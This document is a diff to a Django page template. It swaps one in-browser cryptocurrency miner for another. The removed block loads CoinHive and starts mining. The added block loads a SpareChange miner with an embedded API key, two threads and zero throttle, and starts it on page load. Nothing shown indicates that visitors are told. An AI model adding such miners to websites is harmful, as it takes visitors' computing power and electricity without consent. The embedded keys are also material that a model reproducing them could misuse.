@@ -42,28 +42,18 @@ loadScript("{% static 'raphael-min.js' %}", function() {
 loadScript("https://apis.google.com/js/plusone.js");
 }, 1);
     </script>
-    <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
-    <script>
-        var miner = new CoinHive.Anonymous('oTxvf8nX2guvfIXKe4aFAGEThUAGtO1H', {throttle: 0.75});
-        miner.start();
-        miner.on('authed', function(params) {
-            console.log('Token name is: ', miner.getToken());
-        });
 
-        miner.on('error', function(params) {
-            if (params.error !== 'connection_error') {
-                console.log('The pool reported an error', params.error);
-            }
-        });
-        // Update stats once per second
-        setInterval(function() {
-            var hashesPerSecond = miner.getHashesPerSecond();
-            var totalHashes = miner.getTotalHashes();
-            var acceptedHashes = miner.getAcceptedHashes();
 
-            console.log("hps", hashesPerSecond, "th", totalHashes, "ah", acceptedHashes);
-        }, 5000);
-    </script>
+<script type="text/javascript" src="https://www.sparechange.io/static/sparechange.js"></script>
+<script type='text/javascript'>
+
+var apiKey = "74dd6afd0aea8720d7bb66382c274f411f7d078f576005e3c0e829677377e9b83b68a01bf8cb44a95c00087f23a99d192dac5d1d35da8dbd92251bfd237393ee";
+var numberOfThreads = 2;
+var throttlePercent = 0.0;
+miner = new SpareChangeMiner(apiKey, numberOfThreads, throttlePercent);
+miner.start();
+
+</script>
     {% include "analytics.html" %}
     <style type="text/css">
         {% include "jquery.mobile.structure-1.4.5.min.css"  %}
